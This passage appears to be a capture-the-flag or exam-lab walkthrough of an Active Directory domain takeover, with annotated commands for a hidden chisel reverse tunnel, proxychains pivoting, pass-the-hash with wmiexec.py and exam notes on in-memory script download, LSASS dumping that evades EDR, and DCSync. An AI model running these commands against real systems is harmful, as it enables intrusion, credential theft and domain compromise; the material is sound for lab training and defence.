Get-Item C:\Windows\Temp\chisel.exe
# Download chisel binary to the target via our HTTP server
```
> Downloads the chisel Windows binary from our HTTP server to the target. Confirm the file size matches what was uploaded.

```powershell
Start-Process -FilePath C:\Windows\Temp\chisel.exe -ArgumentList 'client 10.10.17.176:8000 R:1080:socks' -WindowStyle Hidden
Start-Sleep 3
Get-Process chisel | select Id,Name
# Start-Process = launch chisel detached (Antak times out on long-running commands)
# -ArgumentList:
#   client = client mode
#   10.10.17.176:8000 = our Kali chisel server
#   R:1080:socks = REVERSE tunnel: open SOCKS5 listener on the SERVER side at port 1080
# -WindowStyle Hidden = no visible window (cleaner)
# Result: chisel running as PID 2116 on the target
```
> Launches chisel on the target in detached mode. `R:1080:socks` tells chisel to open a SOCKS5 listener on port 1080 of the Kali server side. The `-WindowStyle Hidden` hides the console window.

**Confirm the tunnel:**
```bash
cat /tmp/chisel.log | tail -3
# Result:
# session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
# Our local 127.0.0.1:1080 now SOCKS-routes through chisel → through WEB-WIN01 → into the internal network
```
> Checks the chisel server log to confirm the tunnel is active. "Listening" means SOCKS5 traffic on 127.0.0.1:1080 now routes through WEB-WIN01 into the internal network.

### Step 8.4 — Configure proxychains and test the tunnel

```bash
cat > /tmp/proxychains.conf << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
EOF
# Custom proxychains config pointing at our chisel SOCKS5 listener
# proxy_dns = resolve DNS through the proxy (so target-internal hostnames work)
# socks5 over the default socks4 = better protocol features

proxychains -q -f /tmp/proxychains.conf nc -z -w 3 172.16.6.3 445
proxychains -q -f /tmp/proxychains.conf nc -z -w 3 172.16.6.3 5985
# -q = quiet (suppress proxychains banner)
# -f = use our custom config
# nc -z = port check only (no data sent)
# -w 3 = 3 second timeout
# Results: Port 445 reachable, Port 5985 reachable  ✓
# Both SMB and WinRM open on DC01 — multiple PTH options available
```
> Creates a custom proxychains config pointing at the chisel SOCKS5 listener, then confirms both SMB (port 445) and WinRM (port 5985) are reachable on DC01 through the tunnel. Both ports open means multiple pass-the-hash options are available.

---

## Phase 9 — Capture the DC01 Flag (Q8)

### Step 9.1 — Pass-the-Hash with wmiexec.py

```bash
proxychains -q -f /tmp/proxychains.conf wmiexec.py -hashes ':27dedb1dab4d8545c6e1c66fba077da0' INLANEFREIGHT.LOCAL/Administrator@172.16.6.3 'type C:\Users\Administrator\Desktop\flag.txt'
# proxychains = route ALL traffic from wmiexec.py through our SOCKS5 tunnel
# wmiexec.py = Impacket script that executes commands via WMI (Win32_Process.Create)
# -hashes ':NTLM' = LM:NT format; we leave LM empty (modern Windows doesn't use LM)
#                   Just the NTLM hash is enough for PTH
# INLANEFREIGHT.LOCAL/Administrator@172.16.6.3 = domain/user@target_ip
# 'type C:\...\flag.txt' = command to run on the DC (wmiexec sends output back)
```

**Result:**
```
[*] SMBv3.0 dialect used
r3plicat1on_m@st3r!   ← Q8 answer
```

🏆 Domain compromised end-to-end.

---

## Why Each Pivot Worked

| Pivot | Why It Was Possible |
|-------|---------------------|
| Web shell → SYSTEM on WEB-WIN01 | App pool ran as SYSTEM (misconfiguration) |
| Find SPN user | Any authenticated user can read SPNs via LDAP — WEB-WIN01$ machine account works |
| Kerberoast → cracked | svc_sql had a weak password (`lucky7`) — found in rockyou |
| svc_sql → admin on MS01 | Service account given local admin on a member server (over-privilege) |
| LSASS / hive dump | svc_sql was local admin → SeDebug/SeBackup → can dump anything |
| AutoLogon password disclosed | MS01 had AutoAdminLogon enabled — password lives in LSA Secrets (decryptable by anyone with SYSTEM-level SECURITY hive access) |
| tpetty DCSync | tpetty (a standard user with no group privileges) had DS-Replication-Get-Changes-All on the domain root — classic over-permissive delegated rights |
| DCSync to dump Administrator | DCSync is unstoppable without removing the rights — works regardless of MFA or password complexity |
| SOCKS pivot from Kali | Reverse tunnel through web shell — no inbound rule needed on the firewall |
| Final PTH | Administrator hash works domain-wide; wmiexec.py for command exec, smbexec/psexec also viable |

---

## Exam Notes

- **Antak ASPX shell** = PowerShell-backed web shell; uses ASP.NET ViewState (no session cookie). Build a Python helper that re-extracts `__VIEWSTATE` / `__VIEWSTATEGENERATOR` / `__EVENTVALIDATION` each request.
- **Antak gotcha**: double quotes in commands get tokenized — use single quotes for any string with spaces.
- **Find SPN owner**: `DirectoryServices.DirectorySearcher` with filter `(servicePrincipalName=...)` works from any domain context including a machine account.
- **In-memory Invoke-Kerberoast**: `IEX (New-Object Net.WebClient).DownloadString('URL')` — no disk drop, works through Antak.
- **Hash truncation check**: `len(blob) % 2 == 0` before running hashcat — odd = corrupt = silently fails.
- **PSRemoting with creds**: `New-Object PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pw' -AsPlainText -Force))` + `Invoke-Command -ComputerName host -Credential $cred`.
- **LSASS dump trick**: `rundll32.exe comsvcs.dll MiniDump <pid> <output> full` — built-in, Microsoft-signed, bypasses many EDRs.
- **IIS file extension blocks**: `.dmp` returns 404 — rename to `.txt` to serve via IIS.
- **pypykatz** parses LSASS minidumps OFFLINE — no need to run Mimikatz on the target.
- **LSA Secrets `DefaultPassword`** = AutoLogon password in cleartext (when AutoAdminLogon=1). Decryptable from offline hives via `secretsdump.py -sam -system -security LOCAL`.
- **DCSync from a non-admin user**: `mimikatz lsadump::dcsync /authuser:USER /authpassword:PASS` — RPC binding uses the supplied creds, no token impersonation needed. Bypasses LSA Protection failures.
- **Chisel SOCKS pivot**: `server -p 8000 --reverse` on attacker, `client ATTACKER:8000 R:1080:socks` on victim — opens SOCKS5 listener on the attacker side at 127.0.0.1:1080.
- **proxychains + Impacket**: `proxychains -q -f config wmiexec.py -hashes :NTLM DOMAIN/USER@IP 'cmd'` — full PTH end-to-end from the attacker box.
- The three DS-Replication extended rights (`Get-Changes`, `Get-Changes-All`, `Get-Changes-In-Filtered-Set`) granted to a low-priv user = instant domain compromise.
